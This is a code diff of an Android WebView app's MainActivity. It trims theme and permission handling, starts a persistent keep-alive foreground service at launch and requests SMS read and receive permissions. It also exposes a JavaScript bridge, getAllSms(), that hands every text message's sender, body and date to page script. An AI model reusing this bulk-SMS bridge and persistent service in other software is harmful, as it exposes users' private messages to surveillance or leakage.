@@ -16,7 +16,6 @@ import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 
-
 import org.json.JSONArray;
 import org.json.JSONObject;
 
@@ -31,28 +30,25 @@ import androidx.core.content.ContextCompat;
 public class MainActivity extends AppCompatActivity {
 
 
-    private WebView webView;
+    WebView webView;
 
 
     private static final int SMS_PERMISSION = 200;
-    private static final int NOTIFICATION_PERMISSION = 300;
-
 
 
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
+    protected void onCreate(Bundle b){
 
 
-        super.onCreate(savedInstanceState);
+        super.onCreate(b);
 
 
         setContentView(R.layout.activity_main);
 
 
 
-        // start foreground service permission flow
-        requestNotificationPermission();
+        startKeepAlive();
 
 
 
@@ -60,7 +56,8 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-        webView = findViewById(R.id.webview);
+        webView =
+                findViewById(R.id.webview);
 
 
 
@@ -71,18 +68,6 @@ public class MainActivity extends AppCompatActivity {
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
         settings.setAllowFileAccess(true);
-        settings.setAllowContentAccess(true);
-        settings.setLoadWithOverviewMode(true);
-        settings.setUseWideViewPort(true);
-
-
-
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT){
-
-            WebView.setWebContentsDebuggingEnabled(true);
-
-        }
-
 
 
 
@@ -93,54 +78,13 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-
         webView.setWebViewClient(
-                new WebViewClient(){
-
-
-                    @Override
-                    public void onPageFinished(
-                            WebView view,
-                            String url
-                    ){
-
-                        super.onPageFinished(view,url);
-
-
-
-                        boolean dark =
-                                (getResources()
-                                .getConfiguration()
-                                .uiMode
-                                &
-                                Configuration.UI_MODE_NIGHT_MASK)
-                                ==
-                                Configuration.UI_MODE_NIGHT_YES;
-
-
-
-                        String theme =
-                                dark ? "dark" : "light";
-
-
-
-                        view.evaluateJavascript(
-
-                                "document.documentElement.setAttribute('data-theme','"
-                                + theme +
-                                "')",
-
-                                null
-                        );
-
-                    }
-
-                }
+                new WebViewClient()
         );
 
 
 
-        requestSmsPermission();
+        requestSms();
 
 
 
@@ -148,7 +92,6 @@ public class MainActivity extends AppCompatActivity {
                 "file:///android_asset/index.html"
         );
 
-
     }
 
 
@@ -157,90 +100,25 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-
-    private void requestNotificationPermission(){
-
+    private void startKeepAlive(){
 
 
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU){
-
-
-
-            if(ContextCompat.checkSelfPermission(
-                    this,
-                    Manifest.permission.POST_NOTIFICATIONS
-            )
-            != PackageManager.PERMISSION_GRANTED){
-
-
-
-                ActivityCompat.requestPermissions(
-
-                        this,
-
-                        new String[]{
-                                Manifest.permission.POST_NOTIFICATIONS
-                        },
-
-                        NOTIFICATION_PERMISSION
-                );
-
-
-
-            }else{
-
-
-                startKeepAliveService();
-
-
-            }
-
-
-
-        }else{
-
-
-            startKeepAliveService();
-
-
-        }
-
-
-    }
-
-
-
-
-
-
-
-
-
-    private void startKeepAliveService(){
-
-
-
-        Intent intent =
+        Intent i =
                 new Intent(
                         this,
                         KeepAliveService.class
                 );
 
 
+        if(Build.VERSION.SDK_INT >= 26){
 
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
-
-
-            startForegroundService(intent);
-
+            startForegroundService(i);
 
         }else{
 
-
-            startService(intent);
+            startService(i);
 
         }
-
 
     }
 
@@ -251,19 +129,12 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-
-
-
-    private void requestSmsPermission(){
-
+    private void requestSms(){
 
 
         if(ContextCompat.checkSelfPermission(
-
                 this,
-
                 Manifest.permission.READ_SMS
-
         )
         != PackageManager.PERMISSION_GRANTED){
 
@@ -274,21 +145,17 @@ public class MainActivity extends AppCompatActivity {
                     this,
 
                     new String[]{
-
                             Manifest.permission.READ_SMS,
                             Manifest.permission.RECEIVE_SMS
-
                     },
 
                     SMS_PERMISSION
-            );
 
+            );
 
         }
 
     }
-
-
 
 
 
@@ -301,125 +168,89 @@ public class MainActivity extends AppCompatActivity {
     public class SmsBridge {
 
 
-
         @JavascriptInterface
         public String getAllSms(){
 
 
-
-            JSONArray smsList =
+            JSONArray array =
                     new JSONArray();
 
 
 
-            try {
+            Cursor c =
+                    getContentResolver()
+                    .query(
+
+                            Uri.parse(
+                            "content://sms/"
+                            ),
+
+                            null,
+                            null,
+                            null,
+                            "date DESC"
+
+                    );
 
 
 
-                Uri uri =
-                        Uri.parse(
-                                "content://sms/"
-                        );
+            if(c != null){
 
 
-
-                Cursor cursor =
-                        getContentResolver()
-                        .query(
-                                uri,
-                                null,
-                                null,
-                                null,
-                                "date DESC"
-                        );
+                while(c.moveToNext()){
 
 
-
-                if(cursor != null){
-
-
-
-                    int id =
-                            cursor.getColumnIndex("_id");
-
-
-                    int sender =
-                            cursor.getColumnIndex("address");
-
-
-                    int body =
-                            cursor.getColumnIndex("body");
-
-
-                    int date =
-                            cursor.getColumnIndex("date");
-
-
-
-
-                    while(cursor.moveToNext()){
-
+                    try{
 
 
                         JSONObject sms =
                                 new JSONObject();
 
 
-
-                        sms.put(
-                                "id",
-                                cursor.getString(id)
-                        );
-
-
                         sms.put(
                                 "sender",
-                                cursor.getString(sender)
+                                c.getString(
+                                c.getColumnIndex("address"))
                         );
 
 
                         sms.put(
                                 "message",
-                                cursor.getString(body)
+                                c.getString(
+                                c.getColumnIndex("body"))
                         );
 
 
                         sms.put(
                                 "date",
-                                cursor.getString(date)
+                                c.getString(
+                                c.getColumnIndex("date"))
                         );
 
 
-
-                        smsList.put(sms);
-
-
-                    }
+                        array.put(sms);
 
 
+                    }catch(Exception e){}
 
-                    cursor.close();
 
                 }
 
 
 
-            }catch(Exception e){
-
-                e.printStackTrace();
+                c.close();
 
             }
 
 
 
-            return smsList.toString();
+            return array.toString();
 
 
         }
 
 
     }
-
 
 
 
@@ -431,193 +262,30 @@ public class MainActivity extends AppCompatActivity {
     private void setupSystemTheme(){
 
 
-
-        boolean darkMode =
-                (getResources()
-                .getConfiguration()
-                .uiMode
-                &
-                Configuration.UI_MODE_NIGHT_MASK)
-                ==
-                Configuration.UI_MODE_NIGHT_YES;
-
+        boolean dark =
+        (getResources()
+        .getConfiguration()
+        .uiMode
+        &
+        Configuration.UI_MODE_NIGHT_MASK)
+        ==
+        Configuration.UI_MODE_NIGHT_YES;
 
 
-        Window window =
+
+        Window w =
                 getWindow();
 
 
 
-
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
-
-
-
-            if(darkMode){
-
-
-                window.setStatusBarColor(
-                        Color.parseColor("#121212")
-                );
-
-
-                window.setNavigationBarColor(
-                        Color.parseColor("#121212")
-                );
-
-
-            }else{
-
-
-                window.setStatusBarColor(
-                        Color.WHITE
-                );
-
-
-                window.setNavigationBarColor(
-                        Color.WHITE
-                );
-
-            }
-
-        }
-
-
-
-
-
-        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
-
-
-            if(window.getInsetsController()!=null){
-
-
-                if(!darkMode){
-
-
-                    window.getInsetsController()
-                    .setSystemBarsAppearance(
-
-                            android.view.WindowInsetsController
-                            .APPEARANCE_LIGHT_STATUS_BARS |
-
-                            android.view.WindowInsetsController
-                            .APPEARANCE_LIGHT_NAVIGATION_BARS,
-
-
-                            android.view.WindowInsetsController
-                            .APPEARANCE_LIGHT_STATUS_BARS |
-
-                            android.view.WindowInsetsController
-                            .APPEARANCE_LIGHT_NAVIGATION_BARS
-
-                    );
-
-
-                }
-
-
-            }
-
-
-        }
-
-
-    }
-
-
-
-
-
-
-
-
-
-
-
-    @Override
-    public void onConfigurationChanged(
-            @NonNull Configuration config
-    ){
-
-        super.onConfigurationChanged(config);
-
-
-        setupSystemTheme();
-
-    }
-
-
-
-
-
-
-
-
-
-    @Override
-    public void onRequestPermissionsResult(
-
-            int requestCode,
-
-            @NonNull String[] permissions,
-
-            @NonNull int[] grantResults
-
-    ){
-
-
-
-        super.onRequestPermissionsResult(
-                requestCode,
-                permissions,
-                grantResults
+        w.setStatusBarColor(
+                dark
+                ?
+                Color.DKGRAY
+                :
+                Color.WHITE
         );
 
-
-
-        if(requestCode == NOTIFICATION_PERMISSION){
-
-
-            startKeepAliveService();
-
-
-        }
-
-
     }
-
-
-
-
-
-
-
-
-
-
-    @Override
-    public void onBackPressed(){
-
-
-
-        if(webView != null &&
-                webView.canGoBack()){
-
-
-            webView.goBack();
-
-
-
-        }else{
-
-
-            super.onBackPressed();
-
-        }
-
-
-    }
-
 
 }
